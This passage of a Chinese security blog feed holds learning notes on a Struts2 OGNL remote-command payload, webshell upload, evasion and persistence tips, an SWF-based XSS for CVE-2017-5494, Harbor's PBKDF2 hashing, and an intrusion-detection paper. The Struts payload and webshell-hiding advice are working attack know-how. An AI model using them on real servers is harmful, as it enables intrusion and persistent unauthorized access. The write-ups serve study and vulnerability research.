(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
(#ognlUtil.getExcludedPackageNames().clear()).
(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess
(#dm)))).(#cmd=&amp;apos;whoami&amp;apos;).(#iswin=(@java.lang.System@getProperty
(&amp;apos;os.name&amp;apos;).toLowerCase().contains(&amp;apos;win&amp;apos;))).(#cmds=(#iswin?
{&amp;apos;cmd.exe&amp;apos;,&amp;apos;/c&amp;apos;,#cmd}:{&amp;apos;/bin/bash&amp;apos;,&amp;apos;-c&amp;apos;,#cmd})).(#p=new 
java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).
(#process=#p.start()).(#ros=
(@org.apache.struts2.ServletActionContext@getResponse
().getOutputStream())).(@org.apache.commons.io.IOUtils@copy
(#process.getInputStream(),#ros)).(#ros.flush())
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;对上面一段payload进行格式整理&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;%{
    (#nike=&amp;apos;multipart/form-data&amp;apos;).  访问非根对象nike
    (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).  调用静态方法
    (
    #_memberAccess?
        (#_memberAccess=#dm):
        (
            (#container=#context[&amp;apos;com.opensymphony.xwork2.ActionContext.container&amp;apos;]).
            (
                #ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)  创建类实例
            ).
            (#ognlUtil.getExcludedPackageNames().clear()).
            (#ognlUtil.getExcludedClasses().clear()).
            (
            #context.setMemberAccess(#dm)
            )
        )
    ).
    (#cmd=&amp;apos;whoami&amp;apos;).
    (
        #iswin=(@java.lang.System@getProperty(&amp;apos;os.name&amp;apos;).toLowerCase().contains(&amp;apos;win&amp;apos;))
    ).
    (
    #cmds=(#iswin?{&amp;apos;cmd.exe&amp;apos;,&amp;apos;/c&amp;apos;,#cmd}:{&amp;apos;/bin/bash&amp;apos;,&amp;apos;-c&amp;apos;,#cmd})
    ).
    (
    #p=new java.lang.ProcessBuilder(#cmds)
    ).
    (#p.redirectErrorStream(true)).
    (#process=#p.start()).
    (
    #ros=
        (
        @org.apache.struts2.ServletActionContext@getResponse().getOutputStream()
        )
    ).
    (
    @org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)
    ).
    (#ros.flush())
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;根据大牛们的解读文章，可以了解到&lt;/p&gt;
&lt;p&gt;首先是&lt;em&gt;multipart/form-data&lt;/em&gt;绕过类型判断，然后调用了&lt;em&gt;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS&lt;/em&gt;这个方法给了&lt;em&gt;#_memberAccess&lt;/em&gt;这个节点，然后就是利用&lt;em&gt;java.lang.ProcessBuilder&lt;/em&gt;执行预定的cmd命令，对执行后的错误流进行重定向显示。~~当然这只能算是对于这段payload的主观感觉猜测。&lt;/p&gt;
&lt;p&gt;详细的底层分析可以阅读这篇文章&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://paper.seebug.org/247/&quot; title=&quot;http://paper.seebug.org/247/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://paper.seebug.org/247/&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x03-JSP解析的问题&quot;&gt;&lt;a href=&quot;#0x03-JSP解析的问题&quot; class=&quot;headerlink&quot; title=&quot;0x03 JSP解析的问题&quot;&gt;&lt;/a&gt;0x03 JSP解析的问题&lt;/h2&gt;&lt;p&gt;有朋友在测试时发现，在有漏洞的站点执行命令是很容易的，反弹Shell也可以轻松完成，但上传Webshell就不见得每次都能够顺利完成，而很多时候如果能使用Webshell进行图形界面操作会更加方便。这里就常见的几种上传失败情况进行总结。&lt;/p&gt;
&lt;p&gt;1.上传成功但解析跳转：&lt;/p&gt;
&lt;p&gt;这种情况对应到之前说到的路由关系，我们仍然使用struts2-blank来测试。&lt;/p&gt;
&lt;p&gt;blank默认情况下，有策略限制直接跳转到jsp。&lt;/p&gt;
&lt;p&gt;访问URL：struts2-blank/WEB-INF/jsp/example/Login.jsp，页面会显示403。&lt;br&gt;这个时候发现访问Login.action可以访问成功。此时，如果在当前文件夹下上传test.jsp，必须使用test或者test.action来访问。&lt;/p&gt;
&lt;p&gt;值得一提的是，这种对攻击者上传文件的成功访问是基于以下这条规则：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;action name=&amp;quot;*&amp;quot; class=&amp;quot;example.ExampleSupport&amp;quot;&amp;gt;
    &amp;lt;result&amp;gt;/WEB-INF/jsp/example/{1}.jsp&amp;lt;/result&amp;gt;
&amp;lt;/action&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;简单解释一下，class相当于处理逻辑（Model？），然后对action 的name进行全匹配，将匹配到的文件名进行相应的jsp（View？）跳转。&lt;/p&gt;
&lt;p&gt;而之所以test和test.action都可以被访问到应该是一种缺省规则，在struts.xml中添加如下规则：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;constant name=&amp;quot;struts.action.extension&amp;quot; value=&amp;quot;action&amp;quot;&amp;gt;&amp;lt;/constant&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;此时，test就无法被访问到。&lt;/p&gt;
&lt;p&gt;从上面这种情况来看，跳转的原因首先是对接收的后缀进行匹配，其次是相关action动作的处理，那么我们就可以通过添加和上面相似的规则来实现Webshell的访问。&lt;/p&gt;
&lt;p&gt;这里就不得不提一下struts的运行机制&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;struts.xml,这个按照我的理解就相当于是一个控制器，进行路由控制
    |
    |
   \ /
  class，当路由得到相应的action名后，以相应的method来调用class处理逻辑
    |
    |
   \ /
   jsp,根据处理逻辑的不同，跳转给用户相应的显示页面
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里从我理解的MVC的角度进行解释，根据我查阅的资料，再往下走应该是struts2的filter机制，这里我就先不去理解了。&lt;/p&gt;
&lt;p&gt;2.上传成功，解析出错&lt;/p&gt;
&lt;p&gt;这种情况主要分为两种，一种是解析错但菜刀依然可以执行，另一种是类文件或者库文件缺失，个人猜测通过上传相应的文件到lib或者classes文件夹来进行尝试，但因为缺乏相应的测试条件，这个问题先留在这里，后面实践了再来补写。&lt;/p&gt;
&lt;p&gt;————————————————————2017.3.23 更新&lt;/p&gt;
&lt;p&gt;最近测试的时候发现，解析出错还有一种情况会导致Getshell失败，那就是服务端自己写了错误显示用的jsp，这样就会导致shell上传成功后，显示状态500，一般情况下状态500并不会影响shell连接，但是服务端自己实现500后可能会写入一个跳转操作，跳转回根目录，自然shell就无法访问到。&lt;/p&gt;
&lt;p&gt;这种时候，我们可以利用struts2的漏洞来改写服务端的错误处理代码，禁止出错跳转，是的shell可以被访问到。&lt;/p&gt;
&lt;p&gt;3.负载均衡&lt;/p&gt;
&lt;p&gt;测试中发现，很多Jboss的站会用到负载均衡，导致shell 404，这种情况一种是多试几次，反正有一次应该能够连上，一种是保证每台机器上都有Wenshell。&lt;/p&gt;
&lt;p&gt;————————————————————&lt;/p&gt;
&lt;p&gt;4.无法上传&lt;/p&gt;
&lt;p&gt;根据朋友讲的他遇到的经历，无法上传主要有以下几种情况：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;有防护软件进行文件查杀，这种可以通过一些特殊的Shell来绕过&lt;/li&gt;
&lt;li&gt;长度限制，这种存在于一些服务器对于请求包有所限制，导致过长的shell无法成功上传。&lt;/li&gt;
&lt;li&gt;在手动写文件时，还有些服务器禁用echo等写文件命令也会导致文件出错&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;0x04-其他&quot;&gt;&lt;a href=&quot;#0x04-其他&quot; class=&quot;headerlink&quot; title=&quot;0x04 其他&quot;&gt;&lt;/a&gt;0x04 其他&lt;/h2&gt;&lt;p&gt;在实际测试中发现，许多struts2的应用广泛使用了许多其他中间件，比如Hiberate、HyperSQL、FirebirdSQL等等平时没有使用到的框架或者数据库，还有会使用其他Web服务器的情况，比如JBoss。&lt;/p&gt;
&lt;p&gt;————————————————————2017.3.23 更新&lt;/p&gt;
&lt;p&gt;这里在补充一下shell方面的学习&lt;/p&gt;
&lt;p&gt;1.war包shell&lt;/p&gt;
&lt;p&gt;这种需要服务器开启了热部署相关的应用才能使用，当然~~你愿意重启整个WEB服务也可以，将jsp和WEB-INF打包成一个war包上传，可以实现一个新的路径下的访问。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.freebuf.com/articles/web/36455.html&quot; title=&quot;http://www.freebuf.com/articles/web/36455.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.freebuf.com/articles/web/36455.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这篇文章提到了具体的操作步骤。&lt;/p&gt;
&lt;p&gt;2.jspx shell&lt;/p&gt;
&lt;p&gt;园长在乌云上的JavaWeb系列讲解过，jspx是以xml语法来写jsp文件。个人理解是使用xml语法来规范jsp语法到html。&lt;/p&gt;
&lt;p&gt;当然园长的文章中提到，只要修改tomcat的conf中的web.xml，可以任意后缀解析。&lt;/p&gt;
&lt;p&gt;3.shell隐藏&lt;/p&gt;
&lt;p&gt;同样JavaWeb系列文章中提到了诸如jar包等隐藏方法。&lt;/p&gt;
&lt;p&gt;这里我复现的是91ri的《利用 Java Binary Webshell 对抗静态检测》，里面提到在tomcat下通过修改Catalina的配置文件，来做jsp文件更改延迟，达到欺骗引擎一直返回给浏览器字节码的目的，进而将Webshell隐藏在字节码中，实现无shell jsp文件下的理论上的权限维持&lt;/p&gt;
&lt;p&gt;当然，说是理论上，因为Tomcat只能延迟检测，不能完全去除检测，不知道对Tomcat框架理解深入的大牛们有没有方法完全规避检测~~&lt;/p&gt;
&lt;p&gt;————————————————————&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;Struts2的环境有时候显得有些庞大而复杂，这里借着漏洞学习的过程了解一下Tomcat+Struts2架构的一些问题，这么一看重要的学习其他而不是漏洞了~~。&lt;/p&gt;
&lt;p&gt;修改：2017.3.23&lt;br&gt;
    
    </summary>
    
      <category term="JAVA" scheme="http://phantom0301.cc/categories/JAVA/"/>
    
    
      <category term="struts2" scheme="http://phantom0301.cc/tags/struts2/"/>
    
      <category term="漏洞学习" scheme="http://phantom0301.cc/tags/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>英文文献阅读-使用遗传算法的异常入侵检测</title>
    <link href="http://phantom0301.cc/2017/03/05/ids-ga/"/>
    <id>http://phantom0301.cc/2017/03/05/ids-ga/</id>
    <published>2017-03-05T06:14:15.000Z</published>
    <updated>2017-03-05T07:35:35.096Z</updated>
    
    <content type="html">&lt;p&gt;基于遗传算法进行入侵检测&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;0x01-算法基础&quot;&gt;&lt;a href=&quot;#0x01-算法基础&quot; class=&quot;headerlink&quot; title=&quot;0x01 算法基础&quot;&gt;&lt;/a&gt;0x01 算法基础&lt;/h2&gt;&lt;p&gt;阅读的文献是CCSIT 2012的一篇论文&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Srinivasa K G. Application of Genetic Algorithms for Detecting Anomaly in Network Intrusion Detection Systems&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;论文的核心部分是在GA算法本身的描述上，遗传算法主要是为了解决优化问题，正如它的名字，它模仿了自然界的生物遗传特性，首先提取个体的特征，也就是基因，进行杂交获取不同于父辈的基因，然后使用某种标度去计算子代是否是最优解，如果不是就再一次杂交迭代。&lt;/p&gt;
&lt;h2 id=&quot;0x02-算法实现&quot;&gt;&lt;a href=&quot;#0x02-算法实现&quot; class=&quot;headerlink&quot; title=&quot;0x02 算法实现&quot;&gt;&lt;/a&gt;0x02 算法实现&lt;/h2&gt;&lt;p&gt;在入侵检测方面，文章利用GA算法来产生特征组，GA算法的伪代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Input:
    x[i],代表i时刻的payload
Output:
    fittest,适当的基因
begin:
    for i in [0,G]:
        min_dist = INFINITY
        fittest = 0
        for c in Chromosome:
            dist = manhattan_dis(c,x[i])
            if dist &amp;lt;= min_dist:
                fittest = i
                min_dist = dist
        crossover(fittest,x[i])
        for c in Chromosome:
            mutation(c)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其中G是子代迭代次数，Chromosome是测试后适合加入种群的基因c的基因组，测量的标度是c和x的曼哈顿距离。&lt;/p&gt;
&lt;p&gt;另外还有两个函数，杂交函数crossover和变异函数mutation。&lt;/p&gt;
&lt;p&gt;如伪代码所表示的，在一次次的子代繁殖中，确定出当前的测量值dist，然后将子代与这一代的基因进行杂交，杂交后会产生新的基因组种群，为了快速探索到整个特征空间，引入变异函数来加快这一探索过程。&lt;/p&gt;
&lt;p&gt;杂交函数伪代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Input:
    x[i]
    fittest 合适的基因
Output：
    子代及子代基因，如果满足条件，加入基因组
begin：
    Children[6] = Cross(fittest,x[i])
    杂交后产生的除去2个与父代相同的子代后剩下的6个子代（很拗口的一句话，总之就是2个父代——8个子代——减去2个子代=6个子代）
    for c in Children:
        if fitness(c) &amp;gt; threshold:大于临界值
            add_to_population(c)将该基因加入种群
    remove(fittest)移除父代
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;变异函数如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Input：
    c 基因组内基因
Output：
    c&amp;apos; 变异基因
begin：
    r = random()
    if r &amp;gt; pm(变异可能性):
        mutate(c)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;生成一个随机数，如果它大于变异率，即变异发生。&lt;/p&gt;
&lt;p&gt;当然，这里还有两个问题，杂交和变异到底如何表示，遗传学里的孟德尔的豌豆实验对于两组特征AaBb的豌豆杂交，产生多种基因组合的子代就是杂交，而变异就是一个子代本来是aabb，但是当变异发生，可能会成为Aabb。&lt;/p&gt;
&lt;p&gt;上面是生物学的描述方法，那么在计算机中我们就可以用编码来描述基因，比如一个特征1的编码可以是0001,2编码为0010.那么每两个二进制的数位代表一个基因，1和2杂交可以产生出0000,0001，0010三种子代，当然如果等概率假设的话实际数目应该是4个子代，三种基因。那么，这时，如果产生变异，0010就有可能成为0011，以此类推。&lt;/p&gt;
&lt;p&gt;而在这里，最后的基因组就是异常行为的特征值组。&lt;/p&gt;
&lt;h2 id=&quot;0x03-疑惑&quot;&gt;&lt;a href=&quot;#0x03-疑惑&quot; class=&quot;headerlink&quot; title=&quot;0x03 疑惑&quot;&gt;&lt;/a&gt;0x03 疑惑&lt;/h2&gt;&lt;p&gt;整个论文的核心其实就是上述的一整套算法，接着论文利用这套算法与另一篇论文中的PAYL进行对比，并最终得到结论，论文的算法拥有更高的检出率和更低的误报率，并且训练速度较快。&lt;/p&gt;
&lt;p&gt;这里还有几点疑惑，首先，遗传算法重要的一个研究点就是如何定义基因，或者说是编码，而论文中并没有提出这种编码机制。其次，如果没理解错的话，文中的payload仅使用目标地址和目标端口，这种选取是否合适。另外，就是文中的伪代码描述也不是很清晰。&lt;/p&gt;
&lt;p&gt;当然，这篇文章有可能是建立在其他GA-IDS文章的基础上所以省略了上述说明。&lt;/p&gt;
&lt;p&gt;句式：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In our system we use a two point crossover scheme where the two parents crossover at two different points producing a total of eight off springs out of which two are replicas of the parents itself which are discarded.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;好长的一段话，大意就是说这个两点杂交会产生8个子代，而和父代完全一样的两个子代会被丢弃。主句是we use a two point crossover scheme。where修饰前句，the two parents crossover producing a total of……，然后out of which two指代前面的offsprings，再下一个which修饰two。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;基于遗传算法进行入侵检测&lt;/p&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://phantom0301.cc/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="GA" scheme="http://phantom0301.cc/tags/GA/"/>
    
      <category term="IDS" scheme="http://phantom0301.cc/tags/IDS/"/>
    
  </entry>
  
  <entry>
    <title>Harbor中的用户密码加密机制探究</title>
    <link href="http://phantom0301.cc/2017/02/08/harborpass/"/>
    <id>http://phantom0301.cc/2017/02/08/harborpass/</id>
    <published>2017-02-08T13:22:53.000Z</published>
    <updated>2017-02-09T02:09:20.530Z</updated>
    
    <content type="html">&lt;p&gt;我们一般自己写个小程序做用户验证的时候，大多数情况都是用MD5，sha1，好一点的再加个盐，这次让我们来看看开源软件中的用户密码加密都是怎么实现的。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-Harbor简介&quot;&gt;&lt;a href=&quot;#0x01-Harbor简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 Harbor简介&quot;&gt;&lt;/a&gt;0x01 Harbor简介&lt;/h2&gt;&lt;p&gt;Project Harbor是由VMware公司中国团队为企业用户设计的Registry server开源项目。主要用于Docker镜像仓库的管理。&lt;/p&gt;
&lt;p&gt;嗯，简介就到这里。&lt;/p&gt;
&lt;h2 id=&quot;0x02-算法探究&quot;&gt;&lt;a href=&quot;#0x02-算法探究&quot; class=&quot;headerlink&quot; title=&quot;0x02 算法探究&quot;&gt;&lt;/a&gt;0x02 算法探究&lt;/h2&gt;&lt;p&gt;在Harbor的数据库中看到了这样一条用户验证的存储信息。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;| username  | password                         | salt                             |
| test      | 65e900b5a2bdff474e29d0d2b21f4945 | gktqer4zml32472wmht9xeuixvg5pvjd |
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;test账户的明文密码为 &lt;strong&gt;123QWEqwe&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;看到如上的数据库结构，32位的散列，猜测多半就是MD5（password+salt）的加密套路，然而事实证明我还是太年轻，无论我如何改变密码和盐的组合，都无法得到数据库中的密码散列，为了节省大家尝试的时间，我就把几种组合方式的结果罗列在下面：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;MD5(p+s): 7bd52852dd48c4375aa29bd73e125183&lt;/p&gt;
&lt;p&gt;MD5(s+p): c01fb693df3c524442149ff16d7d5fc8&lt;/p&gt;
&lt;p&gt;MD5(MD5(p)+s): 87b9168b430edb9fcfd03474c7f35ac0&lt;/p&gt;
&lt;p&gt;MD5(MD5(s)+p): d70ffc1ace99fa8d7e52ef3e29907a54&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;……&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;常识性的MD5猜测竟然都没有正确，那么可能的加密方式就难以捉摸了，SHA1后截断？，HMAC？&lt;/p&gt;
&lt;p&gt;首先想到的是去Harbor的官档里找答案，不过大概翻阅了可能的官方文档后，并没有找到对它加密方式的记录。但是在Github的一个issue中，有许多人关于PBKDF2的讨论，会不会是使用这种加密方式呢？&lt;/p&gt;
&lt;p&gt;通过查阅资料得知（中文维基竟然没有关于PBKDF2的解释条目，我的姿势不对？），PBKDF2是一种基于密码的密钥生成函数。&lt;br&gt;这种算法有5个输入参数，如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;DK = PBKDF2(PRF, Password, Salt, c, dkLen)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;PRF是一个伪随机函数，Password是主密码，Salt是盐值，c是算法迭代次数，dkLen是产生密钥的长度。&lt;/p&gt;
&lt;p&gt;那么到这里，我们就需要去读Harbor的源代码来获取算法中的几个常数参数来验证我们的思路。&lt;/p&gt;
&lt;p&gt;Harbor中的代码主要有两种语言构成，Go和AngularJS，这两种都是我没有实践过的语言，定位它的加密函数花费了不少时间。&lt;/p&gt;
&lt;p&gt;首先我们找到Harbor src源码中ui的main.go，可以发现其中有关于密码方面的操作调用了dao这个包，而在dao包中有一个文件叫user.go，其中有个函数LoginByDb，LoginByDb有代码段如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;if user.Password != utils.Encrypt(auth.Password, user.Salt)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以得知，它的加密用的是utils中的Encrypt。&lt;/p&gt;
&lt;p&gt;再跟踪Encrypt函数&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;func Encrypt(content string, salt string) string {
    return fmt.Sprintf(&amp;quot;%x&amp;quot;, pbkdf2.Key([]byte(content), []byte(salt), 4096, 16, sha1.New))
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;果然，Harbor确实使用了pbkdf2算法，调用的Hash函数为Sha1，迭代4096次，密钥长度为int型16位。&lt;/p&gt;
&lt;p&gt;为了验证方便，我在github上&lt;a href=&quot;https://github.com/mitsuhiko/python-pbkdf2/blob/master/pbkdf2.py&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/mitsuhiko/python-pbkdf2/blob/master/pbkdf2.py&lt;/a&gt;找到了一个pbkdf2的python实现，主要代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import hmac
import hashlib
from struct import Struct
from operator import xor
from itertools import izip, starmap


_pack_int = Struct(&amp;apos;&amp;gt;I&amp;apos;).pack
def pbkdf2_hex(data, salt, iterations=4096, keylen=16, hashfunc=None):
    return pbkdf2_bin(data, salt, iterations, keylen, hashfunc).encode(&amp;apos;hex&amp;apos;)

def pbkdf2_bin(data, salt, iterations=4096, keylen=16, hashfunc=None):
    hashfunc = hashfunc or hashlib.sha1
    mac = hmac.new(data, None, hashfunc)
    def _pseudorandom(x, mac=mac):
        h = mac.copy()
        h.update(x)
        return map(ord, h.digest())
    buf = []
    for block in xrange(1, -(-keylen // mac.digest_size) + 1):
        rv = u = _pseudorandom(salt + _pack_int(block))
        for i in xrange(iterations - 1):
            u = _pseudorandom(&amp;apos;&amp;apos;.join(map(chr, u)))
            rv = starmap(xor, izip(rv, u))
        buf.extend(rv)
    return &amp;apos;&amp;apos;.join(map(chr, buf))[:keylen]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;调用相关函数进行测试，&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def check(data, salt, iterations, keylen, expected):
    rv = pbkdf2_hex(data, salt, iterations, keylen)
    if rv == expected:
        print &amp;apos;Test Successful:&amp;apos;
        print &amp;apos;  Expected:   %s&amp;apos; % expected
        print &amp;apos;  Got:        %s&amp;apos; % rv
        print &amp;apos;  Parameters:&amp;apos;
        print &amp;apos;    data=%s&amp;apos; % data
        print &amp;apos;    salt=%s&amp;apos; % salt
        print &amp;apos;    iterations=%d&amp;apos; % iteration
check(&amp;apos;123QWEqwe&amp;apos;, &amp;apos;gktqer4zml32472wmht9xeuixvg5pvjd&amp;apos;, 4096, 16,
      &amp;apos;65e900b5a2bdff474e29d0d2b21f4945&amp;apos;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170209100351.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;得到了和数据库中相同的结果。&lt;/p&gt;
&lt;h2 id=&quot;0x03-结束语&quot;&gt;&lt;a href=&quot;#0x03-结束语&quot; class=&quot;headerlink&quot; title=&quot;0x03 结束语&quot;&gt;&lt;/a&gt;0x03 结束语&lt;/h2&gt;&lt;p&gt;上面提出的Hash密码的算法在国外普遍被接受并运用于密码保护中，可以有效抵抗彩虹表爆破，但是国内这方面的加密往往还是用最基本的几种方式。在今后的程序编写中，可以尝试使用这些更安全的Hash算法。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;我们一般自己写个小程序做用户验证的时候，大多数情况都是用MD5，sha1，好一点的再加个盐，这次让我们来看看开源软件中的用户密码加密都是怎么实现的。&lt;br&gt;
    
    </summary>
    
      <category term="安全基础" scheme="http://phantom0301.cc/categories/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="harbor" scheme="http://phantom0301.cc/tags/harbor/"/>
    
      <category term="pbkdf2" scheme="http://phantom0301.cc/tags/pbkdf2/"/>
    
      <category term="密码学" scheme="http://phantom0301.cc/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>Swf文件利用姿势学习-CVE-2017-5494</title>
    <link href="http://phantom0301.cc/2017/02/06/cveswf/"/>
    <id>http://phantom0301.cc/2017/02/06/cveswf/</id>
    <published>2017-02-06T01:04:43.000Z</published>
    <updated>2017-02-06T03:41:14.262Z</updated>
    
    <content type="html">&lt;p&gt;年前学习审计的时候找到的一个CMS的小漏洞，漏洞的发现过程没有什么值得特别介绍的，不过flash的swf文件利用方法之前没有了解过，借此机会学习一下。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-漏洞简介&quot;&gt;&lt;a href=&quot;#0x01-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞简介&quot;&gt;&lt;/a&gt;0x01 漏洞简介&lt;/h2&gt;&lt;p&gt;CVE列表戳这里：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5494&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;CVE-2017-5494&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;B2evolution是一个功能丰富的blog管理系统，可以建立多权限的社区管理平台。事实上，它的官网就是用自己的系统搭建的。而在它的6.8.4版本中，允许普通用户在设置头像或者评论博客时上传Swf文件，这就使得我们至少可以使用Swf文件来实现跨站脚本。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170206093315.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;上图是它在更新版本中的漏洞修复，将swf文件的上传权限设为admin。&lt;/p&gt;
&lt;h2 id=&quot;0x02-姿势利用&quot;&gt;&lt;a href=&quot;#0x02-姿势利用&quot; class=&quot;headerlink&quot; title=&quot;0x02 姿势利用&quot;&gt;&lt;/a&gt;0x02 姿势利用&lt;/h2&gt;&lt;p&gt;原理性的东西可以参考这一篇文章&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.secpulse.com/archives/44299.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.secpulse.com/archives/44299.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;B2evolution使用flowplayer来加载swf文件。&lt;br&gt;当然这和传统的flash SWF漏洞不太一样，传统的SWF漏洞是通过阅读服务器上的SWF源码，通过SWF执行时的一些输入参数来实现漏洞利用，而在这里，我们是可以任意上传一个SWF文件，也就是说，漏洞点什么的完全可以由我们构造，这样理解的话，我觉得CVE-2017-5494其实不单单是XSS这一种玩法，这其实更像是一个命令执行点。&lt;/p&gt;
&lt;p&gt;通过查阅资料，大致的payload可以有这两种构造方式：&lt;br&gt;一种是将SWF文件反编译后，直接在其中增加恶意代码&lt;br&gt;一种是反编译后，通过flash动画制作软件以动作-帧的方式添加脚本，没错，就是古老的网上一搜一大把的flash马的入门玩法。&lt;/p&gt;
&lt;p&gt;作为漏洞发掘，我使用第二种方式来快速构造执行文件。&lt;/p&gt;
&lt;p&gt;首先从网上下载一段正常的swf视频，反编译导出为fla格式，反编译工具有很多，《Web前端黑客技术揭秘》里提到过SWFScan和swfdump，当然其实不追求HACK仪式感的话，闪客精灵也能很好的完成这部分需求。&lt;/p&gt;
&lt;p&gt;反编译后，可以使用Macromedia Flash来制作，如图，可以直接使用软件带的函数快速插入功能，与浏览器及网络有关的函数主要说这两个：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;fscommand（） 可以直接执行命令的函数，不过只在本地有效。&lt;/li&gt;
&lt;li&gt;getURL（） 我用这个函数来实现与Javascript通信，当然，在AS3中它有新函数来代替，但它依然可用。利用这个函数，我们至少可以实现xss和网页跳转两个功能。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170206111214.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;在打开的fla文件中添加如下动作，&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;getURL(&amp;quot;javascript:alert(1)&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后重新导出当前文件为swf影片，即可上传使用。&lt;/p&gt;
&lt;h2 id=&quot;0x03-本地实战&quot;&gt;&lt;a href=&quot;#0x03-本地实战&quot; class=&quot;headerlink&quot; title=&quot;0x03 本地实战&quot;&gt;&lt;/a&gt;0x03 本地实战&lt;/h2&gt;&lt;p&gt;下载B2evolution的6.8.4版，按照提示安装完成后，注册任意普通用户，并在数据库中强制完成邮箱认证&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170206113347.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;任意点击一篇文章，使用评论中的上传功能，上传构造好的swf文件，然后预览相应的文件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170206113332.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;即可成功执行相应命令。&lt;/p&gt;
